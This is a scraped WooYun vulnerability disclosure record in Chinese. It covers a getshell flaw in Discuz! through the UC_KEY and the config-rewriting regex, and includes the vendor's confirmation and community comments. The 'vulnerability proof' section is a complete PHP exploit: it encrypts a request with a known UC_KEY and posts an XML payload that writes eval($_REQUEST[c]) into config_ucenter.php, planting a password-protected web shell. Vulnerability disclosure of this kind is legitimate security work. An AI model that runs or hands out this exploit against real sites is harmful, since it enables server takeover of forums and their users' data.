{"id": 5887, "wybug_id": "wooyun-2014-048137", "wybug_title": "Discuz的利用UC_KEY进行getshell", "wybug_corp": "Discuz!", "wybug_author": "路人甲", "wybug_date": "2014-01-07 11:43", "wybug_open_date": "2014-02-21 11:43", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-01-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-01-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-01-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-01-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-02-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-02-21：\t细节向公众公开  简要描述： 知key得shell。 详细说明：  \n$configfile = preg_replace(\"/define\\('UC_API',\\s*'.*?'\\);/i\", \"define('UC_API', '\".addslashes($UC_API).\"');\", $configfile);\n这句代码是有漏洞的。如果我第一次提交的是\n\\');phpinfo();\ndefine那句就变成了\ndefine('UC_API','\\');phpinfo();');\n那么我下一次提交呢？非贪婪匹配会匹配到\ndefine('UC_API','\\');\nphpinfo();就留下来了。   漏洞证明：  \n<?php$key = 'cebbvi5s15BSiMXteaP9TNCIz5K5jAVekw7tcV9TqmYCNT5VOJdu7toOxipTX';#少年 uc_key 写在这里$url = 'http://localhost/api/uc.php';$arg = 'action=updateapps&time='.time();#拿webshell：http://localhost/config/config_ucenter.php 密码：cecho 'curl \"'.$url.'?code='.rawurlencode(authcode($arg,'ENCODE',$key)).'\" -d \"'.addslashes('<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><root><item id=\"UC_API\">https://sb\\');eval(\\$_REQUEST[c]);#</item></root>').'\"';#curl或者用其他工具post提交function authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {\t$ckey_length = 4;\t$key = md5($key);\t$keya = md5(substr($key, 0, 16));\t$keyb = md5(substr($key, 16, 16));\t$keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';\t$cryptkey = $keya.md5($keya.$keyc);\t$key_length = strlen($cryptkey);\t$string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;\t$string_length = strlen($string);\t$result = '';\t$box = range(0, 255);\t$rndkey = array();\tfor($i = 0; $i <= 255; $i++) {\t\t$rndkey[$i] = ord($cryptkey[$i % $key_length]);\t}\tfor($j = $i = 0; $i < 256; $i++) {\t\t$j = ($j + $box[$i] + $rndkey[$i]) % 256;\t\t$tmp = $box[$i];\t\t$box[$i] = $box[$j];\t\t$box[$j] = $tmp;\t}\tfor($a = $j = $i = 0; $i < $string_length; $i++) {\t\t$a = ($a + 1) % 256;\t\t$j = ($j + $box[$a]) % 256;\t\t$tmp = $box[$a];\t\t$box[$a] = $box[$j];\t\t$box[$j] = $tmp;\t\t$result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));\t}\tif($operation == 'DECODE') {\t\tif((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {\t\t\treturn substr($result, 26);\t\t} else {\t\t\treturn '';\t\t}\t} else {\t\treturn $keyc.str_replace('=', '', base64_encode($result));\t}}?>\n   修复方案：  你懂的。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-01-08 09:45 厂商回复： 感谢您对我们产品的关注和支持，我们会尽快处理 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-01-07 11:44 |    \t\t灬相随灬 \t\t\t( 普通白帽子  |\t\t\t        Rank:369 漏洞数:68        | 大胆天下去得，小心寸步难行。)\t\t \n  ...................    \n     2014-01-07 11:49 |    \t\t园长 \t\t\t( 普通白帽子  |\t\t\t        Rank:134 漏洞数:14        | 你在身边就是缘，缘分写在数据库里面。)\t\t \n  终于还是发出来了....    \n     2014-01-07 11:52 |    \t\t袋鼠妈妈 \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:61        | 故乡的原风景.MP3)\t\t \n  终于还是发出来了....    \n     2014-01-07 11:58 |    \t\terevus \t\t\t( 普通白帽子  |\t\t\t        Rank:177 漏洞数:31        | Hacked by @ringzero 我錯了)\t\t \n  想知道怎么知道UC_KEY    \n     2014-01-07 12:01 |    \t\t秋风 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:44        | 码农一枚，关注互联网安全)\t\t \n  ......    \n     2014-01-07 12:14 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  @erevus BAK FILE！    \n     2014-01-07 13:33 |    \t\tYwiSax \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:4        | 淡定。)\t\t \n  玩烂了。。。    \n     2014-01-07 14:38 |    \t\tJumbo \t\t\t( 普通白帽子  |\t\t\t        Rank:111 漏洞数:29        | 猫 - http://www.chinabaiker.com)\t\t \n  终于还是发出来了....    \n     2014-01-07 14:45 |    \t\t王老公 \t\t\t( 路人 |\t\t\t        Rank:27 漏洞数:8        | 最新门事件 色中色门户网 www.sexofsex.ca ...)\t\t \n  看完您的漏洞以后,我的心久久不能平静!这条漏洞构思新颖,题材独具匠心,段落清晰,情节诡异,跌宕起伏,主线分明,引人入胜,平淡中显示出不凡的文学功底,可谓是字字珠玑,句句经典,是我辈应学习之典范.就小说艺术的角度而言,可能不算太成功,但它的实验意义却远大于成功本身.一马奔腾,射雕引弓,天地在我心中!您不愧为无厘头界新一代开山怪!是你让我的心里重燃起希望之火,这是难得一见的好说!苍天有眼,让我在有生之年能观得如此精彩漏洞!真如\"大音希声扫阴翳\",犹如\"拨开云雾见青天\",使我等之辈看到希望,晴天霹雳,醍醐灌顶，不足以形容大师文章的构思;巫山行云,长江流水更难比拟大师的文才!你烛照天下,明见万里;雨露苍生,泽被万方!透过你深邃的文字,我仿佛看到了你鹰视狼顾,龙行虎步的伟岸英姿;仿佛看到了你手执如椽大笔,写天下文章的智慧神态;仿佛看见了你按剑四顾,江山无数的英武气概!你说的多好啊!我在网上打滚这么多年,所谓阅人无数,见怪不怪了,但一看您的气势,我就觉得您与在网上灌水的那帮小混蛋有着本质的差别,那忧郁的语调,那熟悉的签名,那高屋建瓴的辞藻，就足以证明您的伟大。是您让中华民族精神得以弘扬。佩服佩服    \n     2014-01-07 15:03 |    \t\t渚熏 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:4        | interesting.)\t\t \n  汝之屌，汝父可知。    \n     2014-01-07 15:40 |    \t\tSkull \t\t\t( 实习白帽子  |\t\t\t        Rank:95 漏洞数:33        | 菜鸟一枚。)\t\t \n  终于还是发出来了....    \n     2014-01-07 15:49 |    \t\tBadCat \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:21        | 悲剧的我什么都不会)\t\t \n  终于还是发出来了....    \n     2014-01-07 16:17 |    \t\thqdvista \t\t\t( 普通白帽子  |\t\t\t        Rank:154 漏洞数:31        | N/A)\t\t \n  终于还是发出来了....    \n     2014-01-07 18:59 |    \t\tx7iao \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:41        | 文能床上控萝莉，武能床上定人妻)\t\t \n  玩到吐了啊 人家猪猪侠拿着dz官方安装统计都扫了一个遍了    \n     2014-01-07 21:05 |    \t\tnull \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:2        | 左岸是无法忘却的回忆，右岸是值得把握的青...)\t\t \n  碉堡    \n     2014-01-07 22:07 |    \t\tBlack Angel \t\t\t( 普通白帽子  |\t\t\t        Rank:163 漏洞数:35        | 最神奇的一群人，智慧低调又内敛，俗称马甲...)\t\t \n  终于还是发出来了....     \n     2014-01-07 22:30 |    \t\t情逍遥 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:3        )\t\t \n  终于还是发出来了....     \n     2014-01-07 22:41 |    \t\t正好五个字 \t\t\t( 实习白帽子  |\t\t\t        Rank:93 漏洞数:15        )\t\t \n  终于还是发出来了....    \n     2014-01-08 10:01 |    \t\t风风 \t\t\t( 普通白帽子  |\t\t\t        Rank:101 漏洞数:43        | 。)\t\t \n  猪哥肯定是日下了安装discuz论坛半壁江山的第一人啊    \n     2014-01-08 10:02 |    \t\tCoody  \t\t\t( 核心白帽子 |\t\t\t        Rank:1565 漏洞数:189        | 不接单、不黑产；如遇接单收徒、绝非本人所...)\t\t \n  永远的路人甲    \n     2014-01-08 10:12 |    \t\t小葵 \t\t\t( 实习白帽子  |\t\t\t        Rank:84 漏洞数:11        | 我们是害虫，我们是害虫！)\t\t \n  终于还是发出来了....    \n     2014-01-08 11:20 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  discuz终于还是来确认漏洞了，可喜可贺 ：）@Discuz! 以后也常来啊    \n     2014-01-08 16:14 |    \t\tx7iao \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:41        | 文能床上控萝莉，武能床上定人妻)\t\t \n  @风风 说的好 都说他只是一头猪    \n     2014-01-08 16:57 |    \t\t秋风 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:44        | 码农一枚，关注互联网安全)\t\t \n  纳尼，确认了？看来discuz是打算修改这一部分的逻辑了？    \n     2014-01-08 19:56 |    \t\tSunshie \t\t\t( 实习白帽子  |\t\t\t        Rank:58 漏洞数:10        | http://phpinfo.me)\t\t \n  求利用方法...    \n     2014-01-08 20:37 |    \t\tBadCat \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:21        | 悲剧的我什么都不会)\t\t \n  纳尼!!!!!!?!!确认了！？！！？！？！？！？！DZ怎么一回事...    \n     2014-01-10 18:23 |    \t\tjk_影 \t\t\t( 实习白帽子  |\t\t\t        Rank:59 漏洞数:9        | 专注google三十年)\t\t \n  估计倒下了不少站点啊    \n     2014-01-11 14:51 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  我早就看到了，exp我都有了！    \n     2014-01-14 09:26 |    \t\t风风 \t\t\t( 普通白帽子  |\t\t\t        Rank:101 漏洞数:43        | 。)\t\t \n  如果是这个  就蛋碎了http://www.oldjun.com/blog/index.php/archives/76/    \n     2014-01-18 11:01 |    \t\tkissy \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:3        | 本人真心热爱，渗透测试、软件逆向等技术，...)\t\t \n  DZ X3.1 的可以么？？    \n     2014-11-16 19:15 |    \t\tRainShine \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:4        )\t\t \n  看完您的漏洞以后,我的心久久不能平静!这条漏洞构思新颖,题材独具匠心,段落清晰,情节诡异,跌宕起伏,主线分明,引人入胜,平淡中显示出不凡的文学功底,可谓是字字珠玑,句句经典,是我辈应学习之典范.就小说艺术的角度而言,可能不算太成功,但它的实验意义却远大于成功本身.一马奔腾,射雕引弓,天地在我心中!您不愧为无厘头界新一代开山怪!是你让我的心里重燃起希望之火,这是难得一见的好说!苍天有眼,让我在有生之年能观得如此精彩漏洞!真如\"大音希声扫阴翳\",犹如\"拨开云雾见青天\",使我等之辈看到希望,晴天霹雳,醍醐灌顶，不足以形容大师文章的构思;巫山行云,长江流水更难比拟大师的文才!你烛照天下,明见万里;雨露苍生,泽被万方!透过你深邃的文字,我仿佛看到了你鹰视狼顾,龙行虎步的伟岸英姿;仿佛看到了你手执如椽大笔,写天下文章的智慧神态;仿佛看见了你按剑四顾,江山无数的英武气概!你说的多好啊!我在网上打滚这么多年,所谓阅人无数,见怪不怪了,但一看您的气势,我就觉得您与在网上灌水的那帮小混蛋有着本质的差别,那忧郁的语调,那熟悉的签名,那高屋建瓴的辞藻，就足以证明您的伟大。是您让中华民族精神得以弘扬。佩服佩服    \n     2014-11-16 23:53 |    \t\tBlack Angel \t\t\t( 普通白帽子  |\t\t\t        Rank:163 漏洞数:35        | 最神奇的一群人，智慧低调又内敛，俗称马甲...)\t\t \n  @RainShine 我居然给看完了    \n     2015-08-20 16:51 |    \t\tBeenQuiver \t\t\t( 普通白帽子  |\t\t\t        Rank:101 漏洞数:26        | 专注而高效，坚持好的习惯千万不要放弃)\t\t \n  吊吊吊    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}